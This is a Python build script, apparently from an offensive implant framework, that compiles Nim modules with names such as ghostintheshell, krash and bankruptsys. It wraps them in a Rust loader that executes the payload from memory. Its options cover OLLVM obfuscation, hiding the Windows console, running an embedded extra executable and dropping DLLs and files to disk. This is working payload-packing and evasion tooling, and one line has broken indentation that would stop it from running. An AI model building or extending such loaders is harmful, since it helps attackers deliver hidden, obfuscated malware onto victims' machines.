#!/usr/bin/env python3
import argparse
from pathlib import Path
import platform
import sys
import os
import shutil
import re
import shlex 
import subprocess
import tempfile
import base64
def compile_nim(nim_file, output_exe, os_name, arch, hide_console=False, nim_defines=None):
    output_exe = Path(output_exe).resolve()
    print(f"[*] Compiling Nim -> {os_name}:{arch}")

    if nim_defines is None:
        nim_defines = []

    nim_cmd = [
        "nim", "c",
        "-d:release",
        "-d:ssl",
    ]
    nim_cmd.append("-d:nimUseCurl")

    for define in nim_defines:
        nim_cmd.append(f"-d:{define}")

    if os_name == "windows":
        if sys.platform == "darwin":
            nim_cmd.append("-d:mingw")
            nim_cmd.append(f"--cpu:{arch}")
        else:
            nim_cmd.append("--os:windows")
            nim_cmd.append(f"--cpu:{arch}")
        if hide_console:
            nim_cmd.append("--app:gui")

    elif os_name == "linux":
        nim_cmd.append("--os:linux")
        nim_cmd.append(f"--cpu:{arch}")

    elif os_name == "macos":
        nim_cmd.append("--os:macosx")
        nim_cmd.append(f"--cpu:{arch}")

    nim_cmd.append(f'--out:{output_exe}')
    nim_cmd.append(str(nim_file))

    print(f"[*] Running Nim compile command: {' '.join(shlex.quote(arg) for arg in nim_cmd)}")
    try:
        result = subprocess.run(nim_cmd, check=True, capture_output=True, text=True)
        print("[+] Nim compiler output:")
        print(result.stdout)
        if result.stderr:
            print("[+] Nim compiler errors:")
            print(result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"[Error] Nim compilation failed with exit code {e.returncode}.")
        print("--- stdout ---")
        print(e.stdout)
        print("--- stderr ---")
        print(e.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print("[Error] 'nim' command not found. Please ensure Nim is installed and in your PATH.")
        sys.exit(1)

    if not output_exe.exists():
        print(f"[Error] Nim compiler finished, but output file was not found at: {output_exe}")
        sys.exit(1)
    print(f"[+] Built Nim executable: {output_exe}")
    return output_exe

def normalize_imports(lines):
    """Normalize Nim import statements by splitting comma-separated imports."""
    result = []
    for line in lines:
        s = line.strip()
        if s.startswith("import "):
            mods = s[len("import "):].split(",")
            for m in mods:
                result.append("import " + m.strip())
        else:
            result.append(line.rstrip("\n"))
    return result

def extract_main_proc(nim_content):
    """Extract the content of proc main(), normalizing its indentation."""
    lines = nim_content.splitlines()
    main_content = []
    in_main = False
    proc_indent_level = 0
    base_content_indent = -1

    for line in lines:
        stripped_line = line.strip()
        if stripped_line.startswith("proc main() ="):
            in_main = True
            proc_indent_level = len(line) - len(line.lstrip())
            continue

        if in_main:
            current_indent = len(line) - len(line.lstrip())
            if current_indent <= proc_indent_level and stripped_line and not line.isspace():
                in_main = False
                continue

            if stripped_line:
                if base_content_indent == -1:
                    base_content_indent = current_indent
                relative_indent = current_indent - base_content_indent
                main_content.append(" " * relative_indent + stripped_line)
    return main_content

def apply_options_with_regex(content, options):
    """
    Applies build options to the Nim source content using regex substitution.
    It looks for patterns like:
    let/const/var optionName = "default value"
    let/const/var optionName = someFunc("default value")
    """
    if not options:
        return content, []

    new_options = []
    for option in options:
        if "=" in option:
            key, value = option.split("=", 1)
            escaped_value = value.strip().replace('\\', '\\\\').replace('"', '\\"')
            pattern = re.compile(r'((?:let|const|var)\s+' + re.escape(key) + r'\*\s*=\s*(?:[a-zA-Z0-9_]+\()?)".*?"', re.DOTALL)
            content = pattern.sub(r'\1"' + escaped_value + '"', content, count=1)
        else:
            new_options.append(option)

    return content, new_options

def merge_nim_modules(nim_files, out_dir: Path, options=None) -> (Path, list):
    """Merge multiple Nim modules into a single file, deduplicating imports and combining proc main()."""
    if len(nim_files) < 2:
        print("[Error] At least two Nim files must be provided for merging.")
        sys.exit(1)

    print(f"[*] Merging modules: {nim_files}")
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "combined.nim"

    merged_imports = set()
    module_bodies = []
    other_code = []
    main_contents = []
    all_options = list(options) if options else []
    
    for f in nim_files:
        fpath = Path(f)
        if not fpath.is_file():
            print(f"[Error] Nim file not found: {f}")
            sys.exit(1)
        print(f"[*] Reading module: {f}")
        with open(f, "r", encoding="utf-8") as fh:
            content = fh.read()

        lines = content.splitlines()
        module_body = []
        in_main_proc = False
        main_proc_indent = -1

        for line in lines:
            stripped = line.strip()

            if stripped.startswith("proc main()"):
                in_main_proc = True
                main_proc_indent = len(line) - len(line.lstrip())
                main_contents.append(extract_main_proc(content))
                continue

            if in_main_proc:
                if stripped and (len(line) - len(line.lstrip()) <= main_proc_indent):
                    in_main_proc = False
                if in_main_proc or stripped.startswith("when isMainModule"):
                    continue

            if stripped.startswith("when isMainModule"):
                continue

            if stripped.startswith("import "):
                mods = stripped[len("import "):].split(",")
                for m in mods:
                    merged_imports.add("import " + m.strip())
            else:
                module_body.append(line)
        
        module_bodies.append("\n".join(module_body))

    final_content_parts = []
    final_content_parts.append("\n".join(sorted(merged_imports)))
    final_content_parts.append("\n\n")
    final_content_parts.append("\n\n".join(module_bodies))
    final_content_parts.append("\n\n")

    final_content_parts[2], _ = apply_options_with_regex(final_content_parts[2], all_options)

    final_content_parts.append("proc main() =\n")

    for main_content in main_contents:
        if not main_content:
            continue
        final_content_parts.append("  block:\n")
        for line in main_content:
            final_content_parts.append("    " + line + "\n")

    final_content_parts.append("\nwhen isMainModule:\n")
    final_content_parts.append("  main()\n")

    final_content = "".join(final_content_parts)

    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write(final_content)

    print("[*] --- Begin Combined Nim Code ---\n" + final_content + "\n[*] --- End Combined Nim Code ---")
    print(f"[+] Wrote merged Nim file: {out_path}")
    return out_path, []

def patch_nim_file(nim_file: Path, options: list) -> list:
    """Injects const declarations into a single Nim file."""
    nim_defines = []
    if options:
        print(f"[*] Patching {nim_file.name} with options: {options}")
        content = nim_file.read_text(encoding="utf-8")
        
        content, nim_defines = apply_options_with_regex(content, options)
        nim_file.write_text(content, encoding="utf-8")
    
    print(f"[*] Found nim defines: {nim_defines}")
    return nim_defines

def parse_target(target_str):
    """Parse the target string into OS and architecture."""
    try:
        os_name, arch = target_str.split(":")
        return os_name, arch
    except ValueError:
        print("[Error] Target must be in format os:arch, e.g. windows:amd64")
        sys.exit(1)


def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None, hide_console=False, embedded_files=None):
    """Generate a Rust wrapper for the Nim executable using in-memory execution."""
    final_exe_path = Path(final_exe)
    package_name = final_exe_path.stem

    if obfuscate:
        docker_path = shutil.which("docker")
        if not docker_path:
            print("[Error] Docker not found. Install Docker to use Obfuscator-LLVM.")
            sys.exit(1)
        print(f"[*] Found docker at: {docker_path}")

    with open(nim_exe, 'rb') as f:
        nim_payload_bytes = f.read()

    nim_payload_array = ','.join(str(b) for b in nim_payload_bytes)

    embed_decl = ""
    embed_code = ""
    if embed_exe:
        with open(embed_exe, "rb") as f:
            embed_bytes = f.read()
        embed_bytes_array = ','.join(str(b) for b in embed_bytes)
        embed_decl = f"const EMBEDDED_EXE: &[u8] = &[{embed_bytes_array}];"
        embed_code = """
    // Run embedded EXE first
    unsafe {
        memexec::memexec_exe(EMBEDDED_EXE).expect("Failed to execute embedded EXE");
    }
"""

    windows_subsystem_attr = ""
    if target_os == "windows" and hide_console:
        windows_subsystem_attr = '#![windows_subsystem = "windows"]'

    file_declarations = ""
    file_drop_code = ""
    if embedded_files:
        file_declarations_parts = []
        file_drop_code_parts = ["    // Drop required files to the current directory"]
        for i, (file_name, file_bytes) in enumerate(embedded_files.items()):
            file_bytes_array = ','.join(str(b) for b in file_bytes)
            file_declarations_parts.append(f'const FILE_{i}_NAME: &str = "{file_name}";')
            file_declarations_parts.append(f'const FILE_{i}_DATA: &[u8] = &[{file_bytes_array}];')
            file_drop_code_parts.append(f'    std::fs::write(FILE_{i}_NAME, FILE_{i}_DATA).expect("Failed to write {file_name}");')
        
        file_declarations = "\n".join(file_declarations_parts)
        file_drop_code = "\n".join(file_drop_code_parts)

    rust_code = f'''
{windows_subsystem_attr}
use memexec;
use std::fs;

{embed_decl}

{file_declarations}

const NIM_PAYLOAD: &[u8] = &[{nim_payload_array}];

fn main() {{
{embed_code}

{file_drop_code}

    unsafe {{
        memexec::memexec_exe(NIM_PAYLOAD).expect("Failed to execute Nim payload from memory");
    }}
}}
'''
    with tempfile.TemporaryDirectory() as tmpdir:
        project_dir = Path(tmpdir) / "rust_project"
        src_dir = project_dir / "src"
        src_dir.mkdir(parents=True)

        main_rs = src_dir / "main.rs"
        main_rs.write_text(rust_code)
        print(f"[*] Wrote Rust wrapper source: {main_rs}")

        cargo_toml_content = f"""
[package]
name = "{package_name}"
version = "0.1.0"
edition = "2018"

[dependencies]
memexec = {{ git = "https://github.com/DmitrijVC/memexec", version = "0.3" }}
"""
        (project_dir / "Cargo.toml").write_text(cargo_toml_content.strip())

        rust_target = {
            ("windows", "amd64"): "x86_64-pc-windows-gnu",
            ("windows", "arm64"): "aarch64-pc-windows-gnu",
            ("linux", "amd64"): "x86_64-unknown-linux-gnu",
            ("linux", "arm64"): "aarch64-unknown-linux-gnu",
            ("macos", "amd64"): "x86_64-apple-darwin",
            ("macos", "arm64"): "aarch64-apple-darwin"
        }[(target_os, target_arch)]

        if obfuscate:
            cargo_cmd = ["cargo", "rustc", "--release", "--target", rust_target, "--"]
            if ollvm:
                cargo_cmd.append(f"-Cllvm-args={ollvm}")

            project_path = str(project_dir)
            volume_mapping = f"{project_path}:/projects"

            docker_cmd = [
                "docker", "run", "--rm",
                "-v", volume_mapping,
                "-w", "/projects",
                "ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest",
                *cargo_cmd
            ]

            print(f"[*] Running Dockerized cargo rustc command: {' '.join(docker_cmd)}")
            try:
                subprocess.run(docker_cmd, check=True, capture_output=True, text=True)
            except subprocess.CalledProcessError as e:
                print(f"[Error] Dockerized Rust compilation failed: {e}")
                print(f"Stdout: {e.stdout}")
                print(f"Stderr: {e.stderr}")
                sys.exit(1)
        else:
            cargo_cmd = [
                "cargo", "build", "--release", "--target", rust_target
            ]

            print(f"[*] Running local cargo rustc command: {' '.join(cargo_cmd)}")
            try:
                subprocess.run(cargo_cmd, check=True, cwd=project_dir, capture_output=True, text=True)
            except subprocess.CalledProcessError as e:
                print(f"[Error] Rust compilation failed: {e}")
                print(f"Stdout: {e.stdout}")
                print(f"Stderr: {e.stderr}")
                sys.exit(1)
            except FileNotFoundError:
                print("[Error] 'cargo' command not found. Please ensure Rust is installed and in your PATH.")
                sys.exit(1)

        output_binary_name = f"{package_name}.exe" if target_os == "windows" else package_name
        compiled_binary = project_dir / "target" / rust_target / "release" / output_binary_name
        if not compiled_binary.exists():
            print(f"[Error] Compiled binary not found at: {compiled_binary}")
            sys.exit(1)
        shutil.move(str(compiled_binary), final_exe_path)
        print(f"[+] Final executable: {final_exe_path}")

def main():
    parser = argparse.ArgumentParser(description="Nim-to-EXE Builder")
    parser.add_argument("--nim_file", type=str, help="Path to a single Nim file")
    parser.add_argument("--merge", nargs="+", help="List of Nim modules to embed")
    parser.add_argument("--output_exe", type=str, required=True, help="Output executable name") 
    parser.add_argument("--embed", type=str, help="Path to additional exe to embed & run")
    parser.add_argument("--nim-only", action="store_true", help="Only build Nim exe (no Rust)")
    parser.add_argument("--obfuscate", action="store_true", help="Enable Rust OLLVM obfuscation")
    parser.add_argument("--ollvm", type=str, help="A string of OLLVM passes, e.g., '-enable-bcfobf -enable-subobf'")
    parser.add_argument("--hide-console", action="store_true", help="Hide console window on Windows")
    parser.add_argument("--target", type=str, default="windows:amd64", help="Target triple (os:arch)")
    parser.add_argument("--option", action="append", help="Option to inject as const (e.g., key=value)")

    args = parser.parse_args()

    if args.merge and args.nim_file:
        print("[Error] Cannot specify both --merge and --nim_file options.")
        sys.exit(1)
    if not args.merge and not args.nim_file:
        print("[Error] Must specify either --merge or --nim_file.")
        sys.exit(1)

    target_os, target_arch = parse_target(args.target)

    script_dir = Path(__file__).parent.resolve()
dll_source_dir = script_dir / 'DEPENDENCIES'

    MODULE_DLLS = {
        'MODULE/ctrlvamp.nim': {'pcre64DllData_b64': 'pcre64.dll'},
        'MODULE/ghostintheshell.nim': {
            'cryptoDllData_b64': 'libcrypto-1_1-x64.dll',
            'sslDllData_b64': 'libssl-1_1-x64.dll'
        },
        'MODULE/krash.nim': {
            'cryptoDllData_b64': 'libcrypto-1_1-x64.dll',
            'sslDllData_b64': 'libssl-1_1-x64.dll'
        }
    }

    nim_options = list(args.option) if args.option else []
    
    selected_module_paths = []
    if args.merge:
        # When merging, check for byovf and replace its path with the one from options
        nim_file_opt = next((opt for opt in nim_options if opt.startswith('nimFile=')), None)
        for module_path in args.merge:
            if 'MODULE/byovf.nim' in module_path and nim_file_opt:
                nim_file_path_str = nim_file_opt.split('=', 1)[1].strip()
                expanded_path_str = os.path.expandvars(nim_file_path_str)
                selected_module_paths.append(str(Path(expanded_path_str).expanduser()))
            else:
                selected_module_paths.append(module_path)
    elif args.nim_file:
        selected_module_paths = [args.nim_file]
    embedded_files_for_rust = {}

    for module_path in selected_module_paths:
        normalized_path = str(Path(module_path)).replace(os.sep, '/')
        if normalized_path in ['MODULE/krash.nim', 'MODULE/ghostintheshell.nim']:
            pem_path = dll_source_dir / 'cacert.pem'
            if pem_path.exists() and not args.nim_only and target_os == 'windows':
                print("[*] Queuing cacert.pem for Rust wrapper embedding.")
                embedded_files_for_rust['cacert.pem'] = pem_path.read_bytes()

        if normalized_path in MODULE_DLLS:
            for const_name, dll_name in MODULE_DLLS[normalized_path].items():
                dll_path = dll_source_dir / dll_name
                if dll_path.exists():
                    if not args.nim_only and target_os == 'windows':
                        print(f"[*] Queuing {dll_name} for Rust wrapper embedding.")
                        embedded_files_for_rust[dll_name] = dll_path.read_bytes()
                    else:
                        print(f"[*] Embedding {dll_name} as base64 for {Path(module_path).name}")
                        dll_content = dll_path.read_bytes()
                        b64_content = base64.b64encode(dll_content).decode('utf-8')
                        nim_options.append(f"{const_name}={b64_content}")
    
    if 'MODULE/byovf.nim' in selected_module_paths and not args.nim_only and target_os == 'windows':
        embed_files_opt = next((opt for opt in nim_options if opt.startswith('embedFiles=')), None)
        if embed_files_opt:
            file_paths_str = embed_files_opt.split('=', 1)[1]
            if file_paths_str:
                for file_path_str_raw in file_paths_str.split(','):
                    file_path_str = file_path_str_raw.strip()
                    if file_path_str: # Only process non-empty paths
                        expanded_path_str = os.path.expandvars(file_path_str)
                        file_path = Path(expanded_path_str).expanduser()
                        if file_path.exists() and file_path.is_file():
                            print(f"[*] Queuing {file_path.name} for Rust wrapper embedding from byovf.")
                            embedded_files_for_rust[file_path.name] = file_path.read_bytes()
                        else:
                            print(f"[Warning] File to embed not found or is a directory: {file_path}")

    final_exe_path_str = args.output_exe
    if target_os == "windows" and not final_exe_path_str.lower().endswith(".exe"):
        final_exe_path_str += ".exe"
        print(f"[+] Corrected output name to: {Path(final_exe_path_str).name}")

    final_exe = Path(final_exe_path_str).resolve()
    final_exe.parent.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmpdir:
        bankruptsys_path_str = 'MODULE/bankruptsys.nim'
        if bankruptsys_path_str in selected_module_paths and not args.nim_only and target_os == 'windows':
            print("[*] Pre-compiling xfs.exe for bankruptsys module.")
            xfs_exe_path = Path(tmpdir) / "xfs.exe"
            compile_nim(
                nim_file=bankruptsys_path_str,
                output_exe=xfs_exe_path,
                os_name=target_os,
                arch=target_arch,
                hide_console=True,
                nim_defines=['xfs']
            )
            if xfs_exe_path.exists():
                print(f"[+] Successfully built {xfs_exe_path.name}, queuing for Rust wrapper embedding.")
                embedded_files_for_rust[xfs_exe_path.name] = xfs_exe_path.read_bytes()
            else:
                print("[Error] Failed to build xfs.exe for bankruptsys. Aborting.")
                sys.exit(1)

        tmp_dir = Path(tmpdir)
        nim_defines = []
        if args.merge:
            launcher_source, nim_defines = merge_nim_modules(args.merge, tmp_dir, options=nim_options)
        elif args.nim_file:
            nim_file_to_compile = args.nim_file
            if 'byovf' in args.nim_file and args.option:
                nim_file_opt = next((opt for opt in args.option if opt.startswith('nimFile=')), None)
                if nim_file_opt:
                    nim_file_path_str = nim_file_opt.split('=', 1)[1].strip()
                    expanded_path_str = os.path.expandvars(nim_file_path_str)
                    nim_file_to_compile = str(Path(expanded_path_str).expanduser())
            launcher_source = Path(nim_file_to_compile).expanduser()
            nim_defines = patch_nim_file(launcher_source, nim_options)

        suffix = ".exe" if target_os == "windows" else ""
        nim_exe_tmp = tmp_dir / f"{final_exe.stem}_nim_payload{suffix}"
        should_hide_nim_console = args.hide_console and target_os == "windows"
        compile_nim(launcher_source, nim_exe_tmp, target_os, target_arch, hide_console=should_hide_nim_console, nim_defines=nim_defines)

        if not args.nim_only and target_os == 'windows':
            print("[*] Generating Rust wrapper to embed Nim payload.")
            generate_rust_wrapper(
                str(nim_exe_tmp),
                final_exe,
                target_os, target_arch,
                embed_exe=args.embed,
                obfuscate=args.obfuscate,
                ollvm=args.ollvm,
                hide_console=args.hide_console,
                embedded_files=embedded_files_for_rust
            )
        else:
            if not args.nim_only and target_os != 'windows':
                print(f"[*] Skipping Rust wrapper for non-Windows target ({target_os}).")
            shutil.move(str(nim_exe_tmp), final_exe)
            print(f"[+] Final executable: {final_exe}")

if __name__ == "__main__":
    main()